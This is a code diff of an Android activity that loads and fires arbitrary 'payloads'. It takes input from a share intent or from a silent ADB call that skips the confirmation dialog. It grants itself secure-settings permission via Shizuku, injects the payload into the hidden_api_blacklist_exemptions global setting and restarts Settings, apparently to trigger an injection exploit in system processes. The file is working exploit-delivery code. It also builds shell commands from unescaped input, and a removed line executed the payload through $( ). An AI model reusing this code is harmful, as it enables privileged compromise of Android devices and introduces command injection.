@@ -1,7 +1,6 @@
 package com.wqry085.deployesystem.next;
 
 import android.app.Activity;
-import android.app.AlertDialog;
 import android.content.ContentValues;
 import android.content.Intent;
 import android.net.Uri;
@@ -9,24 +8,67 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.util.Base64;
+import android.util.Log;
 import android.widget.Toast;
+
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
 import androidx.core.content.FileProvider;
+
+import com.google.android.material.dialog.MaterialAlertDialogBuilder;
 import com.wqry085.deployesystem.MaterialDialogHelper;
-import com.wqry085.deployesystem.ZygoteFragment;
+import com.wqry085.deployesystem.R;
+
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.nio.charset.StandardCharsets;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
 import rikka.shizuku.Shizuku;
 
-public class runpayload extends Activity {
+/**
+ * Payload 加载器 Activity
+ * 
+ * 支持两种调用方式：
+ * 1. 通过分享（Share Intent）接收文件或文本
+ * 2. 通过 ADB 直接调用（静默模式）
+ * 
+ * ADB 调用示例：
+ * am start -n com.wqry085.deployesystem/.next.RunPayload \
+ *     -a com.wqry085.deployesystem.ADB_RUN_PAYLOAD \
+ *     --es payload "your_payload_content"
+ */
+public class RunPayload extends Activity {
 
+    private static final String TAG = "RunPayload";
+
+    // Intent Actions & Extras
+    private static final String ACTION_ADB_RUN = "com.wqry085.deployesystem.ADB_RUN_PAYLOAD";
+    private static final String EXTRA_ADB_DIRECT = "adb_direct_run";
+    private static final String EXTRA_FROM_ADB = "from_adb";
+    private static final String EXTRA_PAYLOAD = "payload";
+
+    // Settings
+    private static final String SETTINGS_KEY = "hidden_api_blacklist_exemptions";
+    private static final String SETTINGS_URI = "content://settings/global";
+    private static final String CONFIG_FILE_PATH = "/data/local/tmp/只读配置.txt";
+    private static final int RESET_DELAY_MS = 200;
+
+    // State
     private Uri fileUri;
-    private boolean fromAdbShell = false;
+    private boolean isSilentMode = false;
+    private final Handler mainHandler = new Handler(Looper.getMainLooper());
+    private final ExecutorService executor = Executors.newSingleThreadExecutor();
+
+    // ==================== Lifecycle ====================
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -34,315 +76,391 @@ public class runpayload extends Activity {
 
         Intent intent = getIntent();
         if (intent == null) {
-            finish();
+            finishQuietly();
             return;
         }
 
-        // 检查是否来自 ADB shell 的直接调用
-        if (isFromAdbShell(intent)) {
-            fromAdbShell = true;
-            handleAdbShellIntent(intent);
-            return;
+        // 检查是否为静默模式（ADB 调用）
+        isSilentMode = isAdbDirectCall(intent);
+
+        if (isSilentMode) {
+            handleAdbIntent(intent);
+        } else {
+            handleShareIntent(intent);
         }
-
-        // 原有逻辑：尝试获取分享的文件 URI
-        fileUri = intent.getParcelableExtra(Intent.EXTRA_STREAM);
-
-        // 如果 fileUri 为 null，尝试从 EXTRA_TEXT 获取文本
-        if (fileUri == null) {
-            String sharedText = intent.getStringExtra(Intent.EXTRA_TEXT);
-            if (sharedText != null && !sharedText.isEmpty()) {
-                try {
-                    // 将文本写入临时文件
-                    File tmp = new File(getCacheDir(), "payload.txt");
-                    try (FileOutputStream fos = new FileOutputStream(tmp)) {
-                        fos.write(sharedText.getBytes(StandardCharsets.UTF_8));
-                    }
-                    // 用 FileProvider 生成 Uri
-                    fileUri = FileProvider.getUriForFile(
-                            this,
-                            getPackageName() + ".fileprovider",
-                            tmp
-                    );
-                } catch (Exception e) {
-                    Toast.makeText(this, "无法创建临时文件", Toast.LENGTH_SHORT).show();
-                    finish();
-                    return;
-                }
-            } else {
-                Toast.makeText(this, "未接收到文件或文本", Toast.LENGTH_SHORT).show();
-                finish();
-                return;
-            }
-        }
-
-        // 显示确认对话框
-        showConfirmDialog();
     }
 
+    @Override
+    protected void onDestroy() {
+        executor.shutdownNow();
+        super.onDestroy();
+    }
+
+    // ==================== Intent Handlers ====================
+
     /**
-     * 检查是否来自 ADB shell 的调用
+     * 检查是否为 ADB 直接调用
      */
-    private boolean isFromAdbShell(Intent intent) {
-        // 方式1：检查特定的 action
-        if ("com.wqry085.deployesystem.ADB_RUN_PAYLOAD".equals(intent.getAction())) {
+    private boolean isAdbDirectCall(@NonNull Intent intent) {
+        // 方式1：特定 Action
+        if (ACTION_ADB_RUN.equals(intent.getAction())) {
             return true;
         }
-        
-        // 方式2：检查特定的 extra 参数
-        if (intent.hasExtra("adb_direct_run")) {
+
+        // 方式2：特定 Extra
+        if (intent.hasExtra(EXTRA_ADB_DIRECT)) {
             return true;
         }
-        
-        // 方式3：检查来自 shell 用户的调用
-        try {
-            String callingPackage = getCallingPackage();
-            if (callingPackage == null && intent.getStringExtra("from_adb") != null) {
-                return true;
-            }
-        } catch (Exception e) {
-            // 忽略异常
+
+        // 方式3：无调用包名 + 标记
+        if (getCallingPackage() == null && intent.hasExtra(EXTRA_FROM_ADB)) {
+            return true;
         }
-        
+
         return false;
     }
 
     /**
-     * 处理 ADB shell 的直接调用
+     * 处理 ADB 静默调用
      */
-    private void handleAdbShellIntent(Intent intent) {
-        String payload = null;
-        
-        // 优先从 extra 参数获取 payload
-        if (intent.hasExtra("payload")) {
-            payload = intent.getStringExtra("payload");
-        } 
-        // 其次从 EXTRA_TEXT 获取
-        else if (intent.hasExtra(Intent.EXTRA_TEXT)) {
-            payload = intent.getStringExtra(Intent.EXTRA_TEXT);
+    private void handleAdbIntent(@NonNull Intent intent) {
+        String payload = extractPayload(intent);
+
+        if (payload != null && !payload.isEmpty()) {
+            executePayload(payload);
         }
-        // 最后从 data 获取
-        else if (intent.getData() != null && "content".equals(intent.getData().getScheme())) {
-            try {
-                payload = readContentFromUri(intent.getData());
-            } catch (Exception e) {
-                // 记录错误但不显示 UI
-                finish();
+
+        finishQuietly();
+    }
+
+    /**
+     * 处理分享 Intent
+     */
+    private void handleShareIntent(@NonNull Intent intent) {
+        // 尝试获取文件 URI
+        fileUri = intent.getParcelableExtra(Intent.EXTRA_STREAM);
+
+        // 如果没有文件，尝试获取文本
+        if (fileUri == null) {
+            String sharedText = intent.getStringExtra(Intent.EXTRA_TEXT);
+
+            if (sharedText == null || sharedText.isEmpty()) {
+                showToast(R.string.runpayload_no_file_or_text);
+                finishQuietly();
+                return;
+            }
+
+            fileUri = createTempFileUri(sharedText);
+            if (fileUri == null) {
+                showToast(R.string.runpayload_cant_create_temp_file);
+                finishQuietly();
                 return;
             }
         }
 
-        if (payload != null && !payload.trim().isEmpty()) {
-            // 直接运行 payload，不显示对话框
-            runpayload(payload); // 保持原始内容，不trim()
-            finish();
-        } else {
-            // 如果没有 payload，直接结束
-            finish();
-        }
+        showConfirmDialog();
     }
 
     /**
-     * 从 content URI 读取内容（保留换行符）
+     * 从 Intent 提取 payload 内容
      */
-    private String readContentFromUri(Uri uri) {
-        try (InputStream inputStream = getContentResolver().openInputStream(uri);
-             ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
-            
-            if (inputStream == null) return null;
-            
-            byte[] buffer = new byte[8192];
-            int read;
-            while ((read = inputStream.read(buffer)) != -1) {
-                baos.write(buffer, 0, read);
+    @Nullable
+    private String extractPayload(@NonNull Intent intent) {
+        // 优先级：payload extra > EXTRA_TEXT > data URI
+        if (intent.hasExtra(EXTRA_PAYLOAD)) {
+            return intent.getStringExtra(EXTRA_PAYLOAD);
+        }
+
+        if (intent.hasExtra(Intent.EXTRA_TEXT)) {
+            return intent.getStringExtra(Intent.EXTRA_TEXT);
+        }
+
+        Uri data = intent.getData();
+        if (data != null && "content".equals(data.getScheme())) {
+            return readContentFromUri(data);
+        }
+
+        return null;
+    }
+
+    // ==================== File Operations ====================
+
+    /**
+     * 创建临时文件并返回 URI
+     */
+    @Nullable
+    private Uri createTempFileUri(@NonNull String content) {
+        try {
+            File tempFile = new File(getCacheDir(), "payload_" + System.currentTimeMillis() + ".txt");
+            try (FileOutputStream fos = new FileOutputStream(tempFile)) {
+                fos.write(content.getBytes(StandardCharsets.UTF_8));
             }
-            return baos.toString("UTF-8"); // 保留所有原始字符包括换行符
-            
-        } catch (Exception e) {
+            return FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", tempFile);
+        } catch (IOException e) {
+            Log.e(TAG, "Failed to create temp file", e);
             return null;
         }
     }
 
-    private void showConfirmDialog() {
-        // 如果是 ADB 调用，直接运行不显示对话框
-        if (fromAdbShell) {
-            handleFile();
-            return;
+    /**
+     * 从 URI 读取内容（保留原始格式）
+     */
+    @Nullable
+    private String readContentFromUri(@NonNull Uri uri) {
+        try (InputStream is = getContentResolver().openInputStream(uri)) {
+            if (is == null) return null;
+            return readStreamFully(is);
+        } catch (IOException e) {
+            Log.e(TAG, "Failed to read from URI: " + uri, e);
+            return null;
         }
-        
-        new AlertDialog.Builder(this)
-                .setTitle("确定要加载第三方？")
-                .setMessage("payload路径来源：" + fileUri.toString())
+    }
+
+    /**
+     * 完整读取输入流（保留所有字符）
+     */
+    @NonNull
+    private String readStreamFully(@NonNull InputStream is) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        byte[] buffer = new byte[8192];
+        int read;
+        while ((read = is.read(buffer)) != -1) {
+            baos.write(buffer, 0, read);
+        }
+        return baos.toString(StandardCharsets.UTF_8.name());
+    }
+
+    // ==================== UI ====================
+
+    /**
+     * 显示确认对话框
+     */
+    private void showConfirmDialog() {
+        new MaterialAlertDialogBuilder(this)
+                .setTitle(R.string.runpayload_confirm_load_third_party)
+                .setMessage(getString(R.string.runpayload_payload_path_source) + "\n" + fileUri)
                 .setCancelable(false)
-                .setPositiveButton("运行payload", (dialog, which) -> handleFile())
-                .setNegativeButton("取消", (dialog, which) -> {
-                    dialog.dismiss();
-                    finish();
+                .setPositiveButton(R.string.runpayload_run_payload, (dialog, which) -> loadAndExecute())
+                .setNegativeButton(R.string.runpayload_cancel, (dialog, which) -> finishQuietly())
+                .setOnDismissListener(dialog -> {
+                    // 如果用户按返回键关闭对话框
                 })
                 .show();
     }
 
     /**
-     * 处理文件内容（完全保留原始格式）
+     * 加载文件并执行
      */
-    private void handleFile() {
-        new Thread(() -> {
-            String content = null;
-            try (InputStream inputStream = getContentResolver().openInputStream(fileUri);
-                 ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
+    private void loadAndExecute() {
+        executor.execute(() -> {
+            String content = readContentFromUri(fileUri);
 
-                if (inputStream == null) {
-                    if (!fromAdbShell) {
-                        runOnUiThread(() -> Toast.makeText(this, "无法打开文件", Toast.LENGTH_SHORT).show());
-                    }
-                    runOnUiThread(this::finish);
-                    return;
-                }
-
-                byte[] buffer = new byte[8192];
-                int read;
-                while ((read = inputStream.read(buffer)) != -1) {
-                    baos.write(buffer, 0, read);
-                }
-                // 直接转换为字符串，保留所有原始字符
-                content = baos.toString(StandardCharsets.UTF_8.name());
-
-            } catch (Exception e) {
-                if (!fromAdbShell) {
-                    final String msg = e.getMessage();
-                    runOnUiThread(() -> Toast.makeText(this, "读取失败: " + msg, Toast.LENGTH_SHORT).show());
-                }
-                runOnUiThread(this::finish);
+            if (content == null) {
+                showToastOnUiThread(R.string.runpayload_cant_open_file);
+                finishOnUiThread();
                 return;
             }
 
-            final String finalContent = content;
-            runOnUiThread(() -> {
+            mainHandler.post(() -> {
                 try {
-                    // 直接传递原始内容，不做任何修改
-                    runpayload(finalContent);
-
+                    executePayload(content);
                 } catch (Exception e) {
-                    if (!fromAdbShell) {
-                        Toast.makeText(this, "处理失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+                    Log.e(TAG, "Execute failed", e);
+                    if (!isSilentMode) {
+                        showToast(getString(R.string.runpayload_process_failed) + e.getMessage());
                     }
                 } finally {
-                    finish();
+                    finishQuietly();
                 }
             });
-        }).start();
+        });
     }
 
+    // ==================== Payload Execution ====================
+
     /**
-     * 运行 payload（完全保留原始格式）
+     * 执行 Payload
      */
-    public void runpayload(String payload) {
-        // 授予权限
-        ShizukuExec("pm grant com.wqry085.deployesystem android.permission.WRITE_SECURE_SETTINGS");
-        ShizukuExec("am force-stop com.android.settings");
-        
-        // 方法1：使用 base64 编码写入，避免 shell 转义问题（推荐）
-        writePayloadWithBase64(payload);
-        
-        // 方法2：直接写入 settings（保持原始内容）
-        ContentValues values = new ContentValues();
-        values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
-        values.put(Settings.Global.VALUE, payload); // 直接使用原始 payload
-        try {
-            getContentResolver().insert(Uri.parse("content://settings/global"), values);
-            if (!fromAdbShell) {
-                Toast.makeText(this, "payload 加载成功", Toast.LENGTH_SHORT).show();
-            }
-        } catch (Exception e) {
-            if (!fromAdbShell) {
-                MaterialDialogHelper.showSimpleDialog(this, "加载payload失败", e.toString());
+    private void executePayload(@NonNull String payload) {
+        Log.i(TAG, "Executing payload, length: " + payload.length());
+
+        // 1. 授予权限
+        shizukuExec("pm grant " + getPackageName() + " android.permission.WRITE_SECURE_SETTINGS");
+
+        // 2. 停止 Settings 应用
+        shizukuExec("am force-stop com.android.settings");
+
+        // 3. 写入配置文件（使用 base64 保留原始格式）
+        writePayloadToFile(payload);
+
+        // 4. 写入系统设置
+        boolean success = writeToSettings(payload);
+
+        // 5. 启动 Settings
+        shizukuExec("am start -n com.android.settings/.Settings");
+
+        // 6. 延迟重置
+        scheduleSettingsReset();
+
+        // 7. 显示结果
+        if (!isSilentMode) {
+            if (success) {
+                showToast(R.string.runpayload_payload_loaded_successfully);
             }
         }
-        
-        // 重启 Settings
-        ShizukuExec("am start -n com.android.settings/.Settings");
-        
-        // 延迟恢复（可选）
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            ContentValues values2 = new ContentValues();
-            values2.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
-            values2.put(Settings.Global.VALUE, "null");
-            try {
-                getContentResolver().insert(Uri.parse("content://settings/global"), values2);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }, 200);
     }
 
     /**
-     * 使用 base64 编码写入文件，完美保留所有字符
+     * 写入 Payload 到文件（使用 base64 编码保证完整性）
      */
-    private void writePayloadWithBase64(String payload) {
+    private void writePayloadToFile(@NonNull String payload) {
         try {
-            // 将 payload 进行 base64 编码
-            String base64Payload = android.util.Base64.encodeToString(
-                payload.getBytes(StandardCharsets.UTF_8), 
-                android.util.Base64.NO_WRAP
+            String base64 = Base64.encodeToString(
+                    payload.getBytes(StandardCharsets.UTF_8),
+                    Base64.NO_WRAP
             );
-            
-            // 写入 base64 编码的内容
-            ShizukuExec("echo '" + base64Payload + "' | base64 -d > /data/local/tmp/只读配置.txt");
-            
+            shizukuExec("echo '" + base64 + "' | base64 -d > " + CONFIG_FILE_PATH);
         } catch (Exception e) {
-            // 如果 base64 方法失败，回退到 printf 方法
-            writePayloadWithPrintf(payload);
+            Log.w(TAG, "Base64 write failed, trying fallback", e);
+            writePayloadFallback(payload);
         }
     }
 
     /**
-     * 使用 printf 写入文件（备用方法）
+     * 备用写入方法（使用 cat 和 heredoc）
      */
-    private void writePayloadWithPrintf(String payload) {
+    private void writePayloadFallback(@NonNull String payload) {
         try {
-            // 转义单引号和其他特殊字符
-            String escapedPayload = payload
-                .replace("'", "'\"'\"'")  // 转义单引号
-                .replace("\\", "\\\\")    // 转义反斜杠
-                .replace("$", "\\$")      // 转义美元符号
-                .replace("`", "\\`")      // 转义反引号
-                .replace("\"", "\\\"");   // 转义双引号
-            
-            // 使用 printf 写入，保持所有格式
-            ShizukuExec("printf '%s' '" + escapedPayload + "' > /data/local/tmp/只读配置.txt");
-            
+            // 使用 heredoc 避免转义问题
+            String delimiter = "EOF_" + System.currentTimeMillis();
+            String command = String.format(
+                    "cat > %s << '%s'\n%s\n%s",
+                    CONFIG_FILE_PATH, delimiter, payload, delimiter
+            );
+            shizukuExec(command);
         } catch (Exception e) {
-            // 最后尝试直接 echo
-            ShizukuExec("echo \"$(" + payload + ")\" > /data/local/tmp/只读配置.txt");
+            Log.e(TAG, "Fallback write failed", e);
         }
     }
 
-    public static String ShizukuExec(String cmd) {
-        StringBuilder output = new StringBuilder();
+    /**
+     * 写入系统设置
+     */
+    private boolean writeToSettings(@NonNull String payload) {
+        ContentValues values = new ContentValues();
+        values.put(Settings.Global.NAME, SETTINGS_KEY);
+        values.put(Settings.Global.VALUE, payload);
+
         try {
-            Process p = Shizuku.newProcess(new String[]{"sh"}, null, null);
-            OutputStream out = p.getOutputStream();
-            out.write((cmd + "\nexit\n").getBytes());
-            out.flush();
-            out.close();
-            BufferedReader mReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            String inline;
-            while ((inline = mReader.readLine()) != null) {
-                output.append(inline).append("\n");
+            getContentResolver().insert(Uri.parse(SETTINGS_URI), values);
+            return true;
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to write settings", e);
+            if (!isSilentMode) {
+                MaterialDialogHelper.showSimpleDialog(
+                        this,
+                        getString(R.string.runpayload_payload_load_failed),
+                        e.getMessage()
+                );
             }
-            BufferedReader errorReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
-            while ((inline = errorReader.readLine()) != null) {
-                output.append(inline).append("\n");
+            return false;
+        }
+    }
+
+    /**
+     * 延迟重置设置
+     */
+    private void scheduleSettingsReset() {
+        mainHandler.postDelayed(() -> {
+            ContentValues values = new ContentValues();
+            values.put(Settings.Global.NAME, SETTINGS_KEY);
+            values.put(Settings.Global.VALUE, "null");
+            try {
+                getContentResolver().insert(Uri.parse(SETTINGS_URI), values);
+            } catch (Exception e) {
+                Log.w(TAG, "Failed to reset settings", e);
+            }
+        }, RESET_DELAY_MS);
+    }
+
+    // ==================== Shizuku ====================
+
+    /**
+     * 通过 Shizuku 执行 Shell 命令
+     */
+    @NonNull
+    private static String shizukuExec(@NonNull String command) {
+        StringBuilder output = new StringBuilder();
+
+        try {
+            Process process = Shizuku.newProcess(new String[]{"sh"}, null, null);
+
+            // 写入命令
+            try (OutputStream os = process.getOutputStream()) {
+                os.write((command + "\nexit\n").getBytes(StandardCharsets.UTF_8));
+                os.flush();
             }
 
-            int exitCode = p.waitFor();
-            if (exitCode != 0) {
-                output.append("漏洞部署结束: ").append(exitCode);
+            // 读取标准输出
+            try (BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
+                }
             }
-            return output.toString();
+
+            // 读取错误输出
+            try (BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
+                }
+            }
+
+            int exitCode = process.waitFor();
+            if (exitCode != 0) {
+                Log.w(TAG, "Command exited with code " + exitCode + ": " + command);
+            }
+
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e(TAG, "Shizuku exec failed: " + command, e);
             return e.toString();
+        }
+
+        return output.toString();
+    }
+
+    // ==================== Utilities ====================
+
+    private void showToast(int resId) {
+        if (!isSilentMode) {
+            Toast.makeText(this, resId, Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void showToast(@NonNull String message) {
+        if (!isSilentMode) {
+            Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void showToastOnUiThread(int resId) {
+        if (!isSilentMode) {
+            mainHandler.post(() -> Toast.makeText(this, resId, Toast.LENGTH_SHORT).show());
+        }
+    }
+
+    private void finishOnUiThread() {
+        mainHandler.post(this::finishQuietly);
+    }
+
+    private void finishQuietly() {
+        try {
+            finish();
+        } catch (Exception e) {
+            // ignore
         }
     }
 }
